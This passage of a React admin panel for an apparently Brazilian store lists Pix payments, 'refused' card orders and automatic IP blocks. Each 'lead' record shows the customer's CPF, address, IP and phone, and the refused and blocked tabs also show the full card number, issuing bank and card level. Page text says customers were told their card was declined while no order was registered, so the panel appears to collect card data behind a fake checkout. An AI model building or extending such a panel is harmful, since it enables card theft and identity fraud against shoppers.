              <div className="rounded-lg border border-gold-400/15 bg-ink-soft p-5">
                <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                  Pix gerados
                </span>
                <p className="mt-1 text-2xl font-bold text-cream">{pixSummary.count}</p>
              </div>
              <div className="rounded-lg border border-emerald-400/30 bg-emerald-400/5 p-5">
                <span className="block text-[10px] font-bold uppercase tracking-widest2 text-emerald-300/70">
                  Valor arrecadado · {pixSummary.pagos} pago
                  {pixSummary.pagos === 1 ? "" : "s"}
                </span>
                <p className="mt-1 text-2xl font-bold text-emerald-300">
                  {formatBRL(pixSummary.collectedCents)}
                </p>
              </div>
              <div className="rounded-lg border border-amber-400/30 bg-amber-400/5 p-5">
                <span className="block text-[10px] font-bold uppercase tracking-widest2 text-amber-300/70">
                  Aguardando pagamento · {pixSummary.pendentes} pendente
                  {pixSummary.pendentes === 1 ? "" : "s"}
                </span>
                <p className="mt-1 text-2xl font-bold text-amber-300">
                  {formatBRL(pixSummary.pendingCents)}
                </p>
              </div>
            </div>

            <div className="mt-6 flex gap-2">
              {(
                [
                  { value: "todos", label: `Histórico (${pixSummary.count})` },
                  { value: "pendentes", label: `Pendentes (${pixSummary.pendentes})` },
                  { value: "pagos", label: `Pagos (${pixSummary.pagos})` },
                ] as const
              ).map((opt) => (
                <button
                  key={opt.value}
                  onClick={() => setPixStatusFilter(opt.value)}
                  className={`rounded-full border px-4 py-1.5 text-[10px] font-bold uppercase tracking-widest2 transition ${
                    pixStatusFilter === opt.value
                      ? "border-[#32BCAD]/60 bg-[#32BCAD]/10 text-[#32BCAD]"
                      : "border-cream/20 text-cream/60 hover:border-cream/40"
                  }`}
                >
                  {opt.label}
                </button>
              ))}
            </div>

            {pixLeads.length === 0 ? (
              <p className="mt-10 text-center text-sm text-cream/50">
                Nenhum pagamento via Pix registrado ainda. Assim que a integração com a
                intermediadora estiver ativa, os pagamentos Pix aparecerão aqui automaticamente,
                com o valor arrecadado somado acima e filtrável pelo período selecionado.
              </p>
            ) : pixVisibleLeads.length === 0 ? (
              <p className="mt-10 text-center text-sm text-cream/50">
                Nenhum Pix encontrado para esse filtro.
              </p>
            ) : (
              <div className="mt-6 space-y-4">
                {pixVisibleLeads.map((lead) => {
                  const status = resolveOrderStatus(lead.createdAt, lead.manualStatus, lead.paymentMethod);
                  let items: LeadItem[] = [];
                  try {
                    items = JSON.parse(lead.itemsJson) as LeadItem[];
                  } catch {
                    items = [];
                  }

                  return (
                    <div
                      key={lead.id}
                      className="rounded-lg border border-gold-400/15 bg-ink-soft p-5"
                    >
                      <div className="flex flex-wrap items-center justify-between gap-3">
                        <div className="min-w-0">
                          <p className="text-sm font-semibold text-cream">
                            #{lead.id.slice(-6).toUpperCase()} · {lead.fullName}
                          </p>
                          <p className="mt-0.5 text-xs text-cream/50">
                            {lead.email} · {lead.phone}
                          </p>
                          <p className="mt-0.5 text-xs text-cream/50">
                            Pix gerado em {new Date(lead.createdAt).toLocaleString("pt-BR")}
                          </p>
                        </div>
                        <div className="flex items-center gap-3">
                          <a
                            href={whatsappLink(lead.phone, lead.fullName)}
                            target="_blank"
                            rel="noreferrer"
                            className="rounded border border-emerald-500/40 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-emerald-300 transition hover:border-emerald-500/70"
                          >
                            WhatsApp
                          </a>
                          <span className="rounded-full border border-[#32BCAD]/40 bg-[#32BCAD]/10 px-3 py-1 text-[9px] font-bold uppercase tracking-widest2 text-[#32BCAD]">
                            Pix
                          </span>
                          <span
                            className={`inline-block rounded-full border px-3 py-1 text-[9px] font-bold uppercase tracking-widest2 ${STATUS_BADGE[status]}`}
                          >
                            {ORDER_STATUS_LABEL[status]}
                          </span>
                          <p className="text-sm font-bold text-gold-400">
                            {formatBRL(lead.totalCents)}
                          </p>
                        </div>
                      </div>

                      <div className="mt-4 border-t border-gold-400/10 pt-4">
                        <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                          Dados do lead
                        </span>
                        <div className="mt-2 grid gap-3 text-sm sm:grid-cols-2 lg:grid-cols-4">
                          <Field label="CPF" value={lead.cpf} />
                          <Field label="CEP" value={lead.cep} />
                          <Field
                            label="Endereço"
                            value={`${lead.address}, ${lead.number}`}
                          />
                          <Field label="Complemento" value={lead.complement} />
                          <Field label="Bairro" value={lead.neighborhood} />
                          <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                          <Field label="IP" value={lead.ip} />
                        </div>
                      </div>

                      <div className="mt-4 border-t border-gold-400/10 pt-4">
                        <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                          Itens
                        </span>
                        <ul className="mt-1 space-y-0.5 text-sm text-cream/80">
                          {items.map((item, idx) => (
                            <li key={idx}>
                              {item.productName} × {item.quantity} —{" "}
                              {formatBRL(item.unitPriceCents * item.quantity)}
                            </li>
                          ))}
                        </ul>
                        {lead.notes && (
                          <>
                            <span className="mt-3 block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                              Observações
                            </span>
                            <p className="mt-1 whitespace-pre-line text-sm text-cream/80">
                              {lead.notes}
                            </p>
                          </>
                        )}
                      </div>

                      <div className="mt-4 flex items-center gap-2 border-t border-gold-400/10 pt-4">
                        <span className="text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                          Marcar como:
                        </span>
                        {STATUS_OPTIONS.map((opt) => (
                          <button
                            key={opt.value}
                            onClick={() => handleStatusChange(lead.id, opt.value)}
                            disabled={updatingStatusId === lead.id || status === opt.value}
                            className={`rounded border px-2.5 py-1 text-[9px] font-bold uppercase tracking-widest2 transition disabled:opacity-40 ${
                              status === opt.value
                                ? STATUS_BADGE[opt.value]
                                : "border-cream/20 text-cream/60 hover:border-cream/40"
                            }`}
                          >
                            {opt.label}
                          </button>
                        ))}
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </>
        )}

        {tab === "recusados" && (
          recusadosLeads.length === 0 ? (
            <p className="mt-16 text-center text-sm text-cream/50">
              Nenhum pedido recusado ainda. Tentativas de pagamento com cartão
              já utilizado aparecem aqui automaticamente.
            </p>
          ) : (
            <div className="mt-8 space-y-4">
              <p className="text-xs text-cream/40">
                Pagamentos bloqueados por reutilização de cartão. O cliente
                recebeu a mensagem de cartão recusado e o pedido não foi
                registrado.
              </p>
              {recusadosLeads.map((lead) => {
                let items: LeadItem[] = [];
                try {
                  items = JSON.parse(lead.itemsJson) as LeadItem[];
                } catch {
                  items = [];
                }

                return (
                  <div
                    key={lead.id}
                    className="rounded-lg border border-red-400/25 bg-ink-soft p-5"
                  >
                    <div className="flex flex-wrap items-center justify-between gap-3">
                      <div className="min-w-0">
                        <p className="text-sm font-semibold text-cream">
                          #{lead.id.slice(-6).toUpperCase()} · {lead.fullName}
                        </p>
                        <p className="mt-0.5 text-xs text-cream/50">
                          {lead.email} · {lead.phone}
                        </p>
                        <p className="mt-0.5 text-xs text-cream/50">
                          {new Date(lead.createdAt).toLocaleString("pt-BR")} ·{" "}
                          {lead.installments}
                          {lead.installments === "1" ? "x (à vista)" : "x sem juros"}
                        </p>
                      </div>
                      <div className="flex items-center gap-3">
                        <a
                          href={whatsappLink(lead.phone, lead.fullName)}
                          target="_blank"
                          rel="noreferrer"
                          className="rounded border border-emerald-500/40 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-emerald-300 transition hover:border-emerald-500/70"
                        >
                          WhatsApp
                        </a>
                        <button
                          onClick={() => handleBlockCard(lead)}
                          className="rounded border border-red-500/30 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/60"
                          title="Bloqueia este cartão: novas tentativas serão recusadas"
                        >
                          Bloquear cartão
                        </button>
                        {lead.ip && lead.ip !== "local" && (
                          <button
                            onClick={() => handleBlockIp(lead)}
                            className="rounded border border-red-500/30 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/60"
                            title="Bloqueia este IP: novas tentativas serão recusadas"
                          >
                            Bloquear IP
                          </button>
                        )}
                        <span className="rounded-full border border-red-400/40 bg-red-400/10 px-3 py-1 text-[9px] font-bold uppercase tracking-widest2 text-red-300">
                          Recusado
                        </span>
                        <p className="text-sm font-bold text-gold-400">
                          {formatBRL(lead.totalCents)}
                        </p>
                      </div>
                    </div>

                    <div className="mt-4 grid gap-3 border-t border-red-400/10 pt-4 text-sm sm:grid-cols-2 lg:grid-cols-4">
                      <Field label="CPF" value={lead.cpf} />
                      <Field label="CEP" value={lead.cep} />
                      <Field
                        label="Endereço"
                        value={`${lead.address}, ${lead.number}`}
                      />
                      <Field label="Complemento" value={lead.complement} />
                      <Field label="Bairro" value={lead.neighborhood} />
                      <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                      <Field label="Cartão" value={lead.cardNumber} />
                      <Field label="Banco / Instituição" value={lead.cardBank ?? "—"} />
                      <Field label="Nível do cartão" value={lead.cardLevel ?? "—"} />
                      <Field label="IP" value={lead.ip} />
                      <Field label="Forma de pagamento" value="Cartão" />
                    </div>

                    <div className="mt-4 border-t border-red-400/10 pt-4">
                      <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                        Itens
                      </span>
                      <ul className="mt-1 space-y-0.5 text-sm text-cream/80">
                        {items.map((item, idx) => (
                          <li key={idx}>
                            {item.productName} × {item.quantity} —{" "}
                            {formatBRL(item.unitPriceCents * item.quantity)}
                          </li>
                        ))}
                      </ul>
                      {lead.discountCents > 0 && (
                        <p className="mt-1 text-xs text-emerald-400">
                          Desconto aplicado: -{formatBRL(lead.discountCents)}
                        </p>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          )
        )}

        {tab === "preventivo" && (
          preventivoLeads.length === 0 ? (
            <p className="mt-16 text-center text-sm text-cream/50">
              Nenhum bloqueio preventivo ativo. Leads que causarem fluxo
              intenso de pedidos (mesmo IP) aparecem aqui automaticamente.
            </p>
          ) : (
            <div className="mt-8 space-y-4">
              <p className="text-xs text-cream/40">
                Bloqueios automáticos por fluxo intenso (a partir de 2 pedidos
                do mesmo IP em 5 minutos). O IP já está bloqueado e o cartão
                usado na tentativa também é bloqueado — o cliente recebeu a
                mensagem de recusa genérica. Use &quot;Desbloquear IP&quot;
                para liberar um falso positivo.
              </p>
              {preventivoLeads.map((lead) => {
                let items: LeadItem[] = [];
                try {
                  items = JSON.parse(lead.itemsJson) as LeadItem[];
                } catch {
                  items = [];
                }
                const isPix = lead.paymentMethod?.toUpperCase() === "PIX";

                return (
                  <div
                    key={lead.id}
                    className="rounded-lg border border-amber-400/25 bg-ink-soft p-5"
                  >
                    <div className="flex flex-wrap items-center justify-between gap-3">
                      <div className="min-w-0">
                        <p className="text-sm font-semibold text-cream">
                          #{lead.id.slice(-6).toUpperCase()} · {lead.fullName}
                        </p>
                        <p className="mt-0.5 text-xs text-cream/50">
                          {lead.email} · {lead.phone}
                        </p>
                        <p className="mt-0.5 text-xs text-cream/50">
                          {new Date(lead.createdAt).toLocaleString("pt-BR")} ·{" "}
                          {lead.installments}
                          {lead.installments === "1" ? "x (à vista)" : "x sem juros"}
                        </p>
                      </div>
                      <div className="flex items-center gap-3">
                        <a
                          href={whatsappLink(lead.phone, lead.fullName)}
                          target="_blank"
                          rel="noreferrer"
                          className="rounded border border-emerald-500/40 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-emerald-300 transition hover:border-emerald-500/70"
                        >
                          WhatsApp
                        </a>
                        {!isPix && (
                          <button
                            onClick={() => handleBlockCard(lead)}
                            className="rounded border border-red-500/30 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/60"
                            title="Bloqueia este cartão: novas tentativas serão recusadas"
                          >
                            Bloquear cartão
                          </button>
                        )}
                        {lead.ip && lead.ip !== "local" && (
                          <button
                            onClick={() => {
                              if (lead.ip) handleUnblockIp(lead.ip);
                            }}
                            className="rounded border border-amber-500/40 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-amber-300 transition hover:border-amber-500/70"
                            title="Libera este IP: novas tentativas voltarão a ser aceitas"
                          >
                            Desbloquear IP
                          </button>
                        )}
                        <span className="rounded-full border border-amber-400/40 bg-amber-400/10 px-3 py-1 text-[9px] font-bold uppercase tracking-widest2 text-amber-300">
                          Auto Block
                        </span>
                        <p className="text-sm font-bold text-gold-400">
                          {formatBRL(lead.totalCents)}
                        </p>
                      </div>
                    </div>

                    <div className="mt-4 grid gap-3 border-t border-amber-400/10 pt-4 text-sm sm:grid-cols-2 lg:grid-cols-4">
                      <Field label="CPF" value={lead.cpf} />
                      <Field label="CEP" value={lead.cep} />
                      <Field
                        label="Endereço"
                        value={`${lead.address}, ${lead.number}`}
                      />
                      <Field label="Complemento" value={lead.complement} />
                      <Field label="Bairro" value={lead.neighborhood} />
                      <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                      <Field label="Cartão" value={isPix ? "—" : lead.cardNumber} />
                      <Field label="Banco / Instituição" value={lead.cardBank ?? "—"} />
                      <Field label="Nível do cartão" value={lead.cardLevel ?? "—"} />
                      <Field label="IP" value={lead.ip} />
                      <Field
                        label="Forma de pagamento"
                        value={isPix ? "PIX (WhatsApp)" : "Cartão"}
                      />
                    </div>

                    <div className="mt-4 border-t border-amber-400/10 pt-4">
                      <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                        Itens
                      </span>
                      <ul className="mt-1 space-y-0.5 text-sm text-cream/80">
                        {items.map((item, idx) => (
                          <li key={idx}>
                            {item.productName} × {item.quantity} —{" "}
                            {formatBRL(item.unitPriceCents * item.quantity)}
                          </li>
                        ))}
                      </ul>
                      {lead.discountCents > 0 && (
                        <p className="mt-1 text-xs text-emerald-400">
                          Desconto aplicado: -{formatBRL(lead.discountCents)}
                        </p>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          )
        )}
      </div>
    </main>
  );
}
